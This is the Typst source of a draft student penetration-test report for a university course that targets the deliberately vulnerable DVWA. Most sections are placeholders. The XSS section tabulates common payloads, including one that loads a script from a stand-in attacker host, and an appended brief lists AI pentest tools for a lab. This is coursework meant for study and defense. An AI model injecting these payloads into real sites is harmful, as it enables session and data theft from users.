#set document(title: "KYBS2001 Penetration Test", author: ("Jani Sourander",))

#import "@preview/gentle-clues:1.3.0": info
#import "theme.typ": theme, severity-badge, issue-table
#show: theme

#align(center)[
  #v(2.5cm)
  #text(size: 22pt, weight: "bold")[KYBS2001 Penetration Test]
  #v(-0.25cm)
  #text(size: 12pt)[by Jani Sourander]
  #v(15.6cm)
  #text(size: 11pt)[Start of testing: April 25, 2026]
  #linebreak()
  #text(size: 11pt)[End of testing: #severity-badge("Critical")]
]

#pagebreak()

#outline(indent: 1.6em)

#pagebreak()
#set page(numbering: "1")
#counter(page).update(1)

#heading(level: 1, numbering: none)[Executive Summary]

This report documents a set of University of Jyväskylä KYBS2001 course penetration testing exercises rather than a full commercial engagement against a live organization. The work was performed against the systems and tasks provided for the KYBS2001 course. To be more precise, the targetted system is known as DVWA (Damn Vulnerable Web Application). As a student, I can activate the vulnerable target for up to 12 hours using TIM learning platform. The exercises contains guided tasks and necessary information such as target IP addresses, credentials, and hints.

Since the target is deliberately vulnerable, it is expected that all exercise will yield positive finding, like _"Yes, the target is vulnerable to XSS"_. Obviously, in an actual commercial engagement, we would not know beforehand if the target is vulnerable to anything, and even worse, we can never be fully sure that we have found all the vulnerabilities. The context is summarized in the @assessment-context below.

#figure(
  table(
    columns: (auto, auto),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
    table.header(
      [*Item*], [*Summary*],
    ),
    [Assessment type], [University penetration testing exercise],
    [Scope], [Seven predefined assignments],
    [Targets], [DVWA hosted by the University],
    [Method], [Using Kali in virtual machine, following assignment instructions],
  ),
  caption: [Assessment context],
) <assessment-context>

The last section of the report includes an Extra Activity documenting setting up a mini-lab for penetration testing. This enables continuous learning.

Table @vuln-overview provides the high-level summary of the exercise findings and links each item to the detailed section where the technical evidence, impact discussion, CVSS scoring, and remediation guidance are presented. (TODO! CVSS scoring etc.)

#figure(
  table(
    columns: (auto, auto, 1fr, auto),
    align: (center, left, left, left),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#F3F4F6") },
    table.header(
      [*Risk*], [*Assignment*], [*Vulnerability*], [*Section*],
    ),
    [#severity-badge("Critical")], [1], [XSS], [@assignment-1],
    [#severity-badge("High")], [2], [Command Execution], [@assignment-2],
    [#severity-badge("Medium")], [3], [File Upload], [@assignment-3],
    [#severity-badge("Low")], [4], [SQL Injection], [@assignment-4],
    [#severity-badge("Low")], [5], [Brute-Force Login], [@assignment-5],
    [#severity-badge("Low")], [6], [NMAP Scan], [@assignment-6],
  ),
  caption: [Vulnerability overview],
) <vuln-overview>


#counter(heading).update(0)

= Assignment: DVWA XSS

== Overview and Definitions

I used the following sources to complete the DVWA XSS assignment:

- Bug Bounty Bootcamp by Vickie Li (No Starch Press, 2021)
    - Chapter 6: Cross-Site Scripting

The heading has two abbreviations: XSS (Cross-Site Scripting) and CVSS (Common Vulnerability Scoring System). Vickie Li explain XSS as _"An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser."_ DVWA (Damn Vulnerable Web Application) is a deliberately vulnerable web application used for security training and testing. It can be found at #link("https://github.com/digininja/DVWA"). Based on the repository README, it seems to run a typical LAMP stack (Linux, Apache, MySQL, PHP). The documentation even points to a YouTube video, where a solution is shown: #link("https://youtu.be/V4MATqtdxss?si=EMHoRvfZz_vI-v14")[Finding and exploiting reflected XSS in DVWA].

Obviously, the KYBS2001 hosted exercise might be hardened somehow so that the exercise is not that trivial. This is essentially the scope of this penetration test experiment. Vickie Li lists a couple of common XSS payloads, which are in the table below.

#figure(
  table(
    columns: (auto, auto),
    stroke: 0.6pt + rgb("#D1D5DB"),
    inset: 7pt,
    fill: (_, y) => if y == 0 { rgb("#d6e0f5") },
    table.header(
      [*Payload*], [*Description*],
    ),
    [`<script>alert(1)</script>`], [Most generic XSS payload],
    [`<iframe src=javascript:alert(1)>`], [Useful when script tags are filtered but iframes are not],
    [`<body onload=alert(1)>`], [Another way to go around the script tag filter],
    [`"><img src=x onerror=prompt(1);>`], [Closes previous tag and inject the code as image error handler],
    [`<script>alert(1)<!–`], [Bypass filters that look for closing script tags],
    [`<a onmouseover"alert(1)">test</a>`], [Trigger XSS on mouseover event],
    [`<script src=//attacker.com/test.js>`], [Run code hosted on attacker's server],
  ),
  caption: [Common XSS payloads],
) <xss-payloads>

According to Li, a good XSS escape test string would be `>'<"//:=;!--`.

== Assignment Solution

TODO

= Assignment: DVWA Command Execution (Injection) <assignment-1>

This section will document the DVWA command execution assignment, including the vulnerable input path, exploitation method, resulting impact, and recommended fixes.

= Assignment: DVWA File Upload <assignment-2>

This section will document the DVWA file upload assignment, including the upload weakness, validation gaps, proof of exploitation, and mitigation steps.

= Assignment: DVWA File Inclusion <assignment-3>

This section will document the DVWA file inclusion assignment, including the affected functionality, inclusion technique, security consequences, and remediation guidance.

= Assignment: DVWA SQL Injection without randomization <assignment-4>

This section will document the DVWA SQL injection assignment without randomization, including the injection point, extraction approach, impact assessment, and defensive measures.

= Assignment: DVWA Brute-Force Login <assignment-5>

This section will document the DVWA brute-force login assignment, including the authentication weakness, attack workflow, impact on account security, and hardening recommendations.

= Assignment: NMAP scan <assignment-6>

This section will document the NMAP scanning assignment, including the scan scope, identified services, notable exposure points, and follow-up observations.

= Extra Activity: Mini-LAB for Pentesting <assignment-extra>

#info[
What/how to deliver:
- code, configs, docs, non-weaponized "test exploit" for demo purposes etc.'
    - ideally github/gitlab/public-git link
    - archived zip containing code
- he code/archive must contain readme.md (in MD format) doc outlining the steps how to run both vulnerable and secured/fixed versions of the lab
- the mini-lab should be ideally run with easy steps/scripts (e.g., git clone ..., ./setup.sh ... , ./run_vuln.sh && ./exploit_test.sh, ./run_secured.sh && ./exploit_test.sh 
- these are just high-level suggestions, you can structure the code/steps/scripts as you wish, but aim for readability + modularity + maintainability + extensibility )
- extra points if you also record+deliver short videos something like up-to 2 minutes (private or public uploads to YouTube or GDrive or FileSender, as you wish) of the lab in all usable situations
- NOTE: the mini-lab should be self-contained, i.e., contain all the download/setup commands, i.e. should not assume that some software/version already exists in the target environment
- Target environment could be bare-bone laptop, bare-bone server, but ideally if possible to have the setup/mini-lab working using docker or VM

Tools

- Brutus (https://github.com/praetorian-inc/brutus)
    - needs to have lab working/demoed with at least "3" different protocols
- Zen-AI-Pentest (https://github.com/SHAdd0WTAka/Zen-Ai-Pentest)
    - needs to have lab working/demoed with at least "2" different real-world/dummy/interntionally-vulnerable targets
- PentestGPT (https://github.com/GreyDGL/PentestGPT)
    - needs to have lab working/demoed with at least "2" different real-world/dummy/interntionally-vulnerable targets
- Shannon (https://github.com/KeygraphHQ/shannon)
    - needs to have lab working/demoed with at least "2" different real-world/dummy/interntionally-vulnerable targets, e.g., two distinct-category vulnerabilities in DVWA
- ToolX: Any tools from here (https://nothingcyber.medium.com/open-source-ai-pentest-red-team-705730238666)
    - needs to have lab working/demoed with at least "2" different real-world/dummy/interntionally-vulnerable targets

In all cases, the targets present/setup MUST also be included in the self-contained lab.
]

= Appendices

== Appendix #1 <appendix-1>

Appendix 1.

== Appendix #2 <appendix-2>

Appendix 2.

